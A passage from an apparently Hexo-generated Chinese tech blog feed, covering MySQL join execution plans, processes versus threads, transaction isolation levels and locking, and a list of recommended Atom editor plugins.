DEFAULT CHARSET=utf8</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> TABLE <span class="symbol">`t2`</span> (</span><br><span class="line"><span class="symbol">`id`</span> int(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line"><span class="symbol">`name`</span> varchar(<span class="number">20</span>) DEFAULT <span class="literal">NULL</span>,</span><br><span class="line"><span class="symbol">`code`</span> varchar(<span class="number">50</span>) DEFAULT <span class="literal">NULL</span>,</span><br><span class="line"><span class="keyword">PRIMARY</span> <span class="keyword">KEY</span> (<span class="symbol">`id`</span>),</span><br><span class="line"><span class="keyword">KEY</span> <span class="symbol">`idx_code`</span> (<span class="symbol">`code`</span>),</span><br><span class="line"><span class="keyword">KEY</span> <span class="symbol">`idx_name`</span> (<span class="symbol">`name`</span>)</span><br><span class="line">) ENGINE=InnoDB AUTO_INCREMENT=<span class="number">6</span> DEFAULT CHARSET=utf8mb4</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t1 (<span class="symbol">`name`</span>,<span class="symbol">`code`</span>) <span class="keyword">values</span>(<span class="string">&#x27;aaa&#x27;</span>,<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t1 (<span class="symbol">`name`</span>,<span class="symbol">`code`</span>) <span class="keyword">values</span>(<span class="string">&#x27;bbb&#x27;</span>,<span class="string">&#x27;bbb&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t1 (<span class="symbol">`name`</span>,<span class="symbol">`code`</span>) <span class="keyword">values</span>(<span class="string">&#x27;ddd&#x27;</span>,<span class="string">&#x27;ddd&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t1 (<span class="symbol">`name`</span>,<span class="symbol">`code`</span>) <span class="keyword">values</span>(<span class="string">&#x27;eee&#x27;</span>,<span class="string">&#x27;eee&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t2 (<span class="symbol">`name`</span>,<span class="symbol">`code`</span>) <span class="keyword">values</span>(<span class="string">&#x27;aaa&#x27;</span>,<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t2 (<span class="symbol">`name`</span>,<span class="symbol">`code`</span>) <span class="keyword">values</span>(<span class="string">&#x27;bbb&#x27;</span>,<span class="string">&#x27;bbb&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t2 (<span class="symbol">`name`</span>,<span class="symbol">`code`</span>) <span class="keyword">values</span>(<span class="string">&#x27;ddd&#x27;</span>,<span class="string">&#x27;ddd&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t2 (<span class="symbol">`name`</span>,<span class="symbol">`code`</span>) <span class="keyword">values</span>(<span class="string">&#x27;eee&#x27;</span>,<span class="string">&#x27;eee&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>查看执行计划：</p>
<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line">explain <span class="keyword">select</span> * <span class="keyword">from</span> t2 left <span class="keyword">join</span> t1 <span class="keyword">on</span> t1.code = t2.code <span class="keyword">where</span> t2.name = <span class="comment">&#x27;dddd&#x27;</span></span><br><span class="line">******************* <span class="number">1</span>. row ****************</span><br><span class="line"><span class="symbol">id:</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">select_type:</span> SIMPLE</span><br><span class="line"><span class="symbol">table:</span> t2</span><br><span class="line"><span class="symbol">partitions:</span> NULL</span><br><span class="line"><span class="symbol">type:</span> ref</span><br><span class="line"><span class="symbol">possible_keys:</span> idx_name</span><br><span class="line"><span class="symbol">key:</span> idx_name</span><br><span class="line"><span class="symbol">key_len:</span> <span class="number">83</span></span><br><span class="line"><span class="symbol">ref:</span> <span class="keyword">const</span></span><br><span class="line"><span class="symbol">rows:</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">filtered:</span> <span class="number">100.00</span></span><br><span class="line"><span class="symbol">Extra:</span> NULL</span><br><span class="line">****************** <span class="number">2</span>. row **************</span><br><span class="line"><span class="symbol">id:</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">select_type:</span> SIMPLE</span><br><span class="line"><span class="symbol">table:</span> t1</span><br><span class="line"><span class="symbol">partitions:</span> NULL</span><br><span class="line"><span class="symbol">type:</span> ALL</span><br><span class="line"><span class="symbol">possible_keys:</span> NULL</span><br><span class="line"><span class="symbol">key:</span> NULL</span><br><span class="line"><span class="symbol">key_len:</span> NULL</span><br><span class="line"><span class="symbol">ref:</span> NULL</span><br><span class="line"><span class="symbol">rows:</span> <span class="number">5</span></span><br><span class="line"><span class="symbol">filtered:</span> <span class="number">100.00</span></span><br><span class="line"><span class="symbol">Extra:</span> <span class="keyword">Using</span> <span class="keyword">where</span>; <span class="keyword">Using</span> <span class="keyword">join</span> buffer (Block Nested <span class="keyword">Loop</span>)</span><br><span class="line"><span class="number">2</span> rows <span class="keyword">in</span> <span class="keyword">set</span>, <span class="number">1</span> warning (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure>

<h2 id="9-参考"><a href="#9-参考" class="headerlink" title="9. 参考"></a>9. 参考</h2><p><span class="exturl" data-url="aHR0cHM6Ly9kZXYubXlzcWwuY29tL2RvYy9yZWZtYW4vOC4wL2VuL2NoYXJzZXQtdW5pY29kZS1jb252ZXJzaW9uLmh0bWw=">https://dev.mysql.com/doc/refman/8.0/en/charset-unicode-conversion.html<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL2ZvcnVtcy5teXNxbC5jb20vcmVhZC5waHA/MTAzLDE4NzA0OCwxODg3NDgjbXNnLTE4ODc0OA==">http://forums.mysql.com/read.php?103,187048,188748#msg-188748<i class="fa fa-external-link-alt"></i></span></p>
<p>Why are we using utf8mb4_general_ci and not utf8mb4_unicode_ci?<br>How to support full Unicode in MySQL databases</p>
<p>10分钟学会理解和解决MySQL乱码问题 <span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvbnM5ZVJ4alhaZlVQTlNwZmdHQTdVQQ==">https://mp.weixin.qq.com/s/ns9eRxjXZfUPNSpfgGA7UA<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>Charset</tag>
      </tags>
  </entry>
  <entry>
    <title>线程和进程的区别是什么？</title>
    <url>/2018/01/concurrency/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>首先来一句概括的总论：进程和线程都是一个时间段的描述，是 CPU 工作时间段的描述。</p>
<p>下面细说背景：</p>
<span id="more"></span>

<p>CPU+RAM + 各种资源（比如显卡，光驱，键盘，GPS, 等等外设）构成我们的电脑，但是电脑的运行，实际就是 CPU 和相关寄存器以及 RAM 之间的事情。</p>
<p>一个最最基础的事实：CPU 太快，太快，太快了，寄存器仅仅能够追的上他的脚步，RAM 和别的挂在各总线上的设备完全是望其项背。那当多个任务要执行的时候怎么办呢？轮流着来？或者谁优先级高谁来？不管怎么样的策略，一句话就是在 CPU 看来就是轮流着来。</p>
<p>一个必须知道的事实：执行一段程序代码，实现一个功能的过程介绍 ，当得到 CPU 的时候，相关的资源必须也已经就位，就是显卡啊，GPS 啊什么的必须就位，然后 CPU 开始执行。这里除了 CPU 以外所有的就构成了这个程序的执行环境，也就是我们所定义的程序上下文。当这个程序执行完了，或者分配给他的 CPU 执行时间用完了，那它就要被切换出去，等待下一次 CPU 的临幸。在被切换出去的最后一步工作就是保存程序上下文，因为这个是下次他被 CPU 临幸的运行环境，必须保存。</p>
<p>串联起来的事实：前面讲过在 CPU 看来所有的任务都是一个一个的轮流执行的，具体的轮流方法就是：先加载程序 A 的上下文，然后开始执行 A，保存程序 A 的上下文，调入下一个要执行的程序 B 的程序上下文，然后开始执行 B, 保存程序 B 的上下文。。。。</p>
<p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 重要的东西出现了 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
<p>进程和线程就是这样的背景出来的，两个名词不过是对应的 CPU 时间段的描述，名词就是这样的功能。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">进程就是包换上下文切换的程序执行时间总和 = <span class="meta">CPU</span> 加载上下文 + <span class="meta">CPU</span> 执行 + <span class="meta">CPU</span> 保存上下文</span><br></pre></td></tr></table></figure>

<h2 id="线程是什么呢？"><a href="#线程是什么呢？" class="headerlink" title="线程是什么呢？"></a>线程是什么呢？</h2><p>进程的颗粒度太大，每次都要有上下的调入，保存，调出。如果我们把进程比喻为一个运行在电脑上的软件，那么一个软件的执行不可能是一条逻辑执行的，必定有多个分支和多个程序段，就好比要实现程序 A，实际分成 a，b，c 等多个块组合而成。那么这里具体的执行就可能变成：</p>
<p>程序 A 得到 CPU &#x3D;》CPU 加载上下文，开始执行程序 A 的 a 小段，然后执行 A 的 b 小段，然后再执行 A 的 c 小段，最后 CPU 保存 A 的上下文。</p>
<p>这里 a，b，c 的执行是共享了 A 的上下文，CPU 在执行的时候没有进行上下文切换的。这里的 a，b，c 就是线程，也就是说线程是共享了进程的上下文环境，的更为细小的 CPU 时间段。</p>
<p>到此全文结束，再一个总结：</p>
<p>进程和线程都是一个时间段的描述，是 CPU 工作时间段的描述，不过是颗粒大小不同。</p>
]]></content>
      <categories>
        <category>Concurrency</category>
      </categories>
      <tags>
        <tag>Process</tag>
        <tag>Thread</tag>
      </tags>
  </entry>
  <entry>
    <title>事务隔离性和锁的区别和联系</title>
    <url>/2018/01/mysql-transaction/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>事务隔离级别是并发控制的整体解决方案，其实际上是综合利用各种类型的锁和行版本控制，来解决并发问题。</p>
<p>锁是数据库并发控制的内部机制，是基础。当然，数据库同时还会利用行版本控制（SQL Server 2005 及以上）来进行并发控制；在数据库内部还使用闩（latch），互斥（mutex）等机制处理内部资源（如，缓存）的并发访问。</p>
<span id="more"></span>

<p>对用户来说，只有当事务隔离级别无法解决一些并发问题和需求时，才有必要在语句中手动设置锁。不适当的设置锁，可能会导致严重的阻塞和死锁。建议，只有在完全了解锁机制的情况下，才可以在语句中手动设置锁，否则应该使用事务隔离级别。</p>
<p><span class="exturl" data-url="aHR0cDovL2Jicy5jc2RuLm5ldC90b3BpY3MvMzQwMTkwNTMz">http://bbs.csdn.net/topics/340190533<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="通过实际操作直观看到了隔离级别以及不同隔离级别对锁的运用"><a href="#通过实际操作直观看到了隔离级别以及不同隔离级别对锁的运用" class="headerlink" title="通过实际操作直观看到了隔离级别以及不同隔离级别对锁的运用"></a>通过实际操作直观看到了隔离级别以及不同隔离级别对锁的运用</h2><p>数据库隔离级别有四种，应用《高性能 mysql》一书中的说明：</p>
<p>然后说说修改事务隔离级别的方法：</p>
<ol>
<li>全局修改，修改 mysql.ini 配置文件，在最后加上<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span>#可选参数有：<span class="keyword">READ</span>-UNCOMMITTED, <span class="keyword">READ</span>-COMMITTED, REPEATABLE-<span class="keyword">READ</span>, SERIALIZABLE.</span><br><span class="line"><span class="symbol">2 </span>[mysqld]</span><br><span class="line"><span class="symbol">3 </span>transaction-isolation = REPEATABLE-<span class="keyword">READ</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>这里全局默认是 REPEATABLE-READ, 其实 MySQL 本来默认也是这个级别</p>
<ol start="2">
<li>对当前 session 修改，在登录 mysql 客户端后，执行命令：</li>
</ol>
<p>要记住 mysql 有一个 autocommit 参数，默认是 on，他的作用是每一条单独的查询都是一个事务，并且自动开始，自动提交（执行完以后就自动结束了，如果你要适用 select for update，而不手动调用 start transaction，这个 for update 的行锁机制等于没用，因为行锁在自动提交后就释放了），所以事务隔离级别和锁机制即使你不显式调用 start transaction，这种机制在单独的一条查询语句中也是适用的，分析锁的运作的时候一定要注意这一点</p>
<h2 id="再来说说锁机制："><a href="#再来说说锁机制：" class="headerlink" title="再来说说锁机制："></a>再来说说锁机制：</h2><p>共享锁：由读表操作加上的锁，加锁后其他用户只能获取该表或行的共享锁，不能获取排它锁，也就是说只能读不能写</p>
<p>排它锁：由写表操作加上的锁，加锁后其他用户不能获取该表或行的任何锁，典型是 mysql 事务中</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">start</span> <span class="keyword">transaction</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> userId = <span class="number">1</span> <span class="keyword">for</span> <span class="keyword">update</span>;</span><br></pre></td></tr></table></figure>

<p>执行完这句以后</p>
<p>1）当其他事务想要获取共享锁，比如事务隔离级别为 SERIALIZABLE 的事务，执行</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>;</span><br></pre></td></tr></table></figure>
<p> 将会被挂起，因为 SERIALIZABLE 的 select 语句需要获取共享锁</p>
<p>2）当其他事务执行</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> userId = <span class="number">1</span> <span class="keyword">for</span> <span class="keyword">update</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> userAge = <span class="number">100</span> <span class="keyword">where</span> userId = <span class="number">1</span>; </span><br></pre></td></tr></table></figure>

<p>也会被挂起，因为 for update 会获取这一行数据的排它锁，需要等到前一个事务释放该排它锁才可以继续进行</p>
<h2 id="锁的范围"><a href="#锁的范围" class="headerlink" title="锁的范围:"></a>锁的范围:</h2><p>行锁: 对某行记录加上锁</p>
<p>表锁: 对整个表加上锁</p>
<p>这样组合起来就有，行级共享锁，表级共享锁，行级排他锁，表级排他锁 </p>
<hr>
<p>下面来说说不同的事务隔离级别的实例效果，例子使用 InnoDB，开启两个客户端 A，B，在 A 中修改事务隔离级别，在 B 中开启事务并修改数据，然后在 A 中的事务查看 B 的事务修改效果：</p>
<h2 id="1-READ-UNCOMMITTED-读取未提交内容-级别"><a href="#1-READ-UNCOMMITTED-读取未提交内容-级别" class="headerlink" title="1. READ-UNCOMMITTED (读取未提交内容) 级别"></a>1. READ-UNCOMMITTED (读取未提交内容) 级别</h2><p>1）A 修改事务级别并开始事务，对 user 表做一次查询</p>
<ol start="2">
<li>B 更新一条记录、</li>
</ol>
<p>3）此时 B 事务还未提交，A 在事务内做一次查询，发现查询结果已经改变</p>
<p>4）B 进行事务回滚</p>
<p>5）A 再做一次查询，查询结果又变回去了</p>
<p>6）A 表对 user 表数据进行修改</p>
<p>7）B 表重新开始事务后，对 user 表记录进行修改，修改被挂起，直至超时，但是对另一条数据的修改成功，说明 A 的修改对 user 表的数据行加行共享锁 (因为可以使用 select)</p>
<p>可以看出 READ-UNCOMMITTED 隔离级别，当两个事务同时进行时，即使事务没有提交，所做的修改也会对事务内的查询做出影响，这种级别显然很不安全。但是在表对某行进行修改时，会对该行加上行共享锁</p>
<h2 id="2-READ-COMMITTED（读取提交内容）"><a href="#2-READ-COMMITTED（读取提交内容）" class="headerlink" title="2. READ-COMMITTED（读取提交内容）"></a>2. READ-COMMITTED（读取提交内容）</h2><p>1）设置 A 的事务隔离级别，并进入事务做一次查询</p>
<p>2）B 开始事务，并对记录进行修改</p>
<p>3）A 再对 user 表进行查询，发现记录没有受到影响</p>
<p>4）B 提交事务</p>
<p>5）A 再对 user 表查询，发现记录被修改</p>
<p>6）A 对 user 表进行修改</p>
<p>7）B 重新开始事务，并对 user 表同一条进行修改，发现修改被挂起，直到超时，但对另一条记录修改，却是成功，说明 A 的修改对 user 表加上了行共享锁 (因为可以 select)</p>
<p>READ-COMMITTED 事务隔离级别，只有在事务提交后，才会对另一个事务产生影响，并且在对表进行修改时，会对表数据行加上行共享锁</p>
<h2 id="3-REPEATABLE-READ-可重读"><a href="#3-REPEATABLE-READ-可重读" class="headerlink" title="3. REPEATABLE-READ (可重读)"></a>3. REPEATABLE-READ (可重读)</h2><p>1）A 设置事务隔离级别，进入事务后查询一次</p>
<p>2）B 开始事务，并对 user 表进行修改</p>
<p>3）A 查看 user 表数据，数据未发生改变</p>
<p>4）B 提交事务</p>
<p>5）A 再进行一次查询，结果还是没有变化</p>
<p>6）A 提交事务后，再查看结果，结果已经更新</p>
<p>7）A 重新开始事务，并对 user 表进行修改</p>
<p>8）B 表重新开始事务，并对 user 表进行修改，修改被挂起，直到超时，对另一条记录修改却成功，说明 A 对表进行修改时加了行共享锁 (可以 select)</p>
<p>REPEATABLE-READ 事务隔离级别，当两个事务同时进行时，其中一个事务修改数据对另一个事务不会造成影响，即使修改的事务已经提交也不会对另一个事务造成影响。</p>
<p>在事务中对某条记录修改，会对记录加上行共享锁，直到事务结束才会释放。</p>
<h2 id="4-SERIERLIZED-可串行化"><a href="#4-SERIERLIZED-可串行化" class="headerlink" title="4. SERIERLIZED (可串行化)"></a>4. SERIERLIZED (可串行化)</h2><p>1）修改 A 的事务隔离级别，并作一次查询</p>
<p>2）B 对表进行查询，正常得出结果，可知对 user 表的查询是可以进行的</p>
<p>3）B 开始事务，并对记录做修改，因为 A 事务未提交，所以 B 的修改处于等待状态，等待 A 事务结束，最后超时，说明 A 在对 user 表做查询操作后，对表加上了共享锁</p>
<p>SERIALIZABLE 事务隔离级别最严厉，在进行查询时就会对表或行加上共享锁，其他事务对该表将只能进行读操作，而不能进行写操作。</p>
<hr>
<p>在实际业务处理中，需要很多步动作连贯完成，比如最经典的银行转账，A 给 B 转 100 元，必须要保证先从 A 账户减去 100，然后在 B 账户加 100，这个动作是不能间断的（这个例子说明了为什么需要事务，如果再引入 C，C 同时从 A 账户取钱，则可以解释为什么要对 A 账户加锁），从程序角度看，为了保证这个动作完成，诞生了事务，事务有四个特性 ACID，但事务仅仅只是一个概念，他不是具体的技术手段，那需要具体怎么做才能保证事务 ACID 四个特性呢？关系型数据库一般通过事务日志和锁的手段实现，事务日志保证了原子性、一致性，事务日志是由数据库自行完成，因此一般开发人员接触不到事务日志，大概原理，就是在进行一切实际数据操作之前，都先写好日志，如果数据库发生意外（比如断电）后，及时可以通过日志来自行恢复。锁则保证了隔离性，保证多个事务能够按照串行化的方式请求同一数据。</p>
<p>但现实世界是，很多操作需要并行，简单粗暴的将所有操作（增删改查）通过锁来串行化运行必然行不通，因此需要更精细化来锁定资源，从两个方面入手，第一，针对锁下手，增加锁的类型：共享锁（S）、独占锁（X），还有一个特殊的更新锁（U），还有几乎不接触的意向锁、架构锁等，针对每个锁的解释请参见《锁模式》，他们之间是否兼容的情况请看《锁兼容性》；第二，针对锁资源范围（锁粒度），共有 11 个粒度，针对每个粒度的说明，MSDN 有更详尽的资料，这里就不再粘贴，附上链接：《锁粒度和层次》。至于平时我们经常看到的乐观锁和悲观锁，可以参考 Hibernate 中的相关内容。</p>
<p>一般来说，实际开发中，直接操作数据库中各种锁的几率相对比较少，更多的是利用数据库提供的四个隔离级别，未提交读、已提交读、可重复读、可序列化，还有一个特殊的基于行版本的已提交读隔离级别，把它也可以归到已提交读内，基于行版本的隔离级别就是乐观锁的处理方式。那隔离级别和锁是什么关系？通俗来说，隔离级别是锁的一个整体打包解决方案，我的理解是隔离封装了锁。针对这四种隔离，他们有各自的优点和缺点，如下表：</p>
<table>
<thead>
<tr>
<th>隔离级别</th>
<th>脏读</th>
<th>丢失更新</th>
<th>不可重复读</th>
<th>幻读</th>
</tr>
</thead>
<tbody><tr>
<td>未提交读：Read Uncommited</td>
<td>是</td>
<td>是</td>
<td>是</td>
<td>是</td>
</tr>
<tr>
<td>已提交读：Read commited</td>
<td>否</td>
<td>是</td>
<td>是</td>
<td>是</td>
</tr>
<tr>
<td>可重复读：Repeatable Read</td>
<td>否</td>
<td>否</td>
<td>否</td>
<td>是</td>
</tr>
<tr>
<td>可串行读：Serializable</td>
<td>否</td>
<td>否</td>
<td>否</td>
<td>否</td>
</tr>
</tbody></table>
<p>从表来看，隔离级别从上到下依次增加，级别越低，引起的问题也就比较多，比如脏读、丢失更新等，但等级越高，也就意味着需要管理更多的锁，无法并行处理，性能方面又受损，因此，我们在设计系统时，只需要根据业务需求选择一种当下适合的隔离级别。一种隔离级别，就有一套利用锁的方案，如此设计，目的就是为了平衡性能和功能。</p>
<p>如何选择一种合适的隔离级别，首选需要了解脏读、丢失更新、不可重复读和幻读的引发的问题，有篇文章举得例子不错，移步：《事务之间的相互影响》，看完这篇文章中的例子，大多数人基本就明白了，下面是用自己语言总结的：</p>
<p>脏读：事务 A 读到事务 B 尚未提交的修改（update，Insert，Delete）记录后，事务 B 回滚了，事务 A 读取到的就是不存在的数据；</p>
<p>不可重复读：事务 A 第一次读取后，事务 B 进行了修改（Delete、Update），再当事务 A 读取时，发现数据在一个事务中前后不一；</p>
<p>幻读：和不可重复读类似，但幻读针对 Insert 操作，当事务 A 第一读取是表内有 10 行数据，此时事务 B 插入（Insert）了一条，当事务 A 再次读取时发现变成了 11 行，造成幻觉；</p>
<p>丢失更新：事务 A 和事务 B 拿到同一份数据 1，A 在 1 的基础上加 1 变成 2 后，此时 B 也在 1 的基础上加 2 变成 3，由于 B 提交晚，因此最终数据变成了 3，覆盖了事务 A 的操作，称为丢失更新；</p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
  </entry>
  <entry>
    <title>Atom的插件必备</title>
    <url>/2018/02/github-atom/</url>
    <content><![CDATA[<h2 id="ATOM常用插件推荐"><a href="#ATOM常用插件推荐" class="headerlink" title="ATOM常用插件推荐"></a>ATOM常用插件推荐</h2><ol>
<li><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL3NpbXBsaWZpZWQtY2hpbmVzZS1tZW51">simplified-chinese-menu<i class="fa fa-external-link-alt"></i></span> ATOM的汉化插件</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2ZpbGUtaWNvbnM=">file-icons<i class="fa fa-external-link-alt"></i></span> 文件图标美化</li>
</ol>
<span id="more"></span>

<ol start="3">
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2F0b20tYmVhdXRpZnk=">atom-beautify<i class="fa fa-external-link-alt"></i></span> 代码格式一键美化</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2xhc3QtY3Vyc29yLXBvc2l0aW9u">last-cursor-position<i class="fa fa-external-link-alt"></i></span> 光标自由切换到上一次&#x2F;下一次编辑位置</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL21pbmltYXA=">minimap<i class="fa fa-external-link-alt"></i></span> 代码小地图</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL3N5bmMtc2V0dGluZ3M=">sync-settings<i class="fa fa-external-link-alt"></i></span> 插件备份、按键绑定备份</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2FjdGl2YXRlLXBvd2VyLW1vZGU=">activate-power-mode<i class="fa fa-external-link-alt"></i></span> 输入时有震撼效果</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL3RvcnRvaXNlLXN2bg==">tortoise-svn<i class="fa fa-external-link-alt"></i></span> svn插件</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2F0b20tdGVybWluYWwtcGFuZWw=">atom-terminal-panel<i class="fa fa-external-link-alt"></i></span> atom内置命令行工具</p>
</li>
<li><p><span class="exturl" data-url="aHR0cDovL2xpYi5jc2RuLm5ldC9iYXNlL2dpdA==">Git<i class="fa fa-external-link-alt"></i></span> &#x2F;github</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2dpdC1wbHVz">git-plus<i class="fa fa-external-link-alt"></i></span>—在 Atom 里面执行 Git 命令，不用来回切换终端和编辑器<br><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2dpdC1jb250cm9s">git-control<i class="fa fa-external-link-alt"></i></span>—git面板 <br><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL3RyZWUtdmlldy1naXQtc3RhdHVz">tree-view-git-status<i class="fa fa-external-link-alt"></i></span>—文件夹git状态<br><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2dpc3QtaXQ=">gist-it<i class="fa fa-external-link-alt"></i></span>—快速分享代码到gist.github.com<br><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2dpdC1sb2c=">git-log<i class="fa fa-external-link-alt"></i></span>-图形化git提交记录</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL21hcmtkb3duLXByZXZpZXctcGx1cw==">markdown-preview-plus<i class="fa fa-external-link-alt"></i></span>—markdown预览</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL3ZpbS1tb2Rl">vim-mode<i class="fa fa-external-link-alt"></i></span> 支持vim模式</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL3NjcmlwdA==">script<i class="fa fa-external-link-alt"></i></span> 在atom下运行脚本，支持多种开发语言。</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL3JlbW90ZS1lZGl0">remote-edit<i class="fa fa-external-link-alt"></i></span> 编辑机远程文件</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2Jyb3dzZXItcGx1cw==">browser-plus<i class="fa fa-external-link-alt"></i></span> 编辑器内置浏览器    </p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2Fzay1zdGFjaw==">ask-stack<i class="fa fa-external-link-alt"></i></span> 在atom快速提问stackoverflow</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL3JlZ2V4LXJhaWxyb2FkLWRpYWdyYW0=">regex-railroad-diagram<i class="fa fa-external-link-alt"></i></span> 正则表达式图形化</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2FkdmFuY2VkLW9wZW4tZmlsZQ==">advanced-open-file<i class="fa fa-external-link-alt"></i></span> 快速的打开文件或新建文件，同时支持路径补全</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL3F1aWNrLWhpZ2hsaWdodA==">quick-highlight<i class="fa fa-external-link-alt"></i></span> 代码高亮</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL3BsYXRmb3JtaW8taWRlLXRlcm1pbmFs">platformio-ide-terminal<i class="fa fa-external-link-alt"></i></span> 终端工具</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL29wZW4taW4tYnJvd3NlcnM=">open-in-browsers<i class="fa fa-external-link-alt"></i></span> 在安装过的任意浏览器打开代码</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL21lcmdlLWNvbmZsaWN0cw==">merge-conflicts<i class="fa fa-external-link-alt"></i></span> 在 Atom 里面处理合并产生冲突的文件</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2xpbnRlcg==">linter<i class="fa fa-external-link-alt"></i></span> 代码校验工具</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2F1dG9jb21wbGV0ZS1wYXRocw==">autocomplete-paths<i class="fa fa-external-link-alt"></i></span> 填写路径的时候有提示</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2xpbnRlcg==">linter<i class="fa fa-external-link-alt"></i></span> 代码校验工具(必备)</p>
</li>
</ol>
<h2 id="前端插件推荐"><a href="#前端插件推荐" class="headerlink" title="前端插件推荐"></a>前端插件推荐</h2><ol>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2VtbWV0">emmet<i class="fa fa-external-link-alt"></i></span> 加快web开发速度，提供snippet(代码片段)、abbreviation expand(简写展开)功能。</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2NvbG9yLXBpY2tlcg==">color-picker<i class="fa fa-external-link-alt"></i></span> 在编辑器里面挑选颜色</p>
</li>
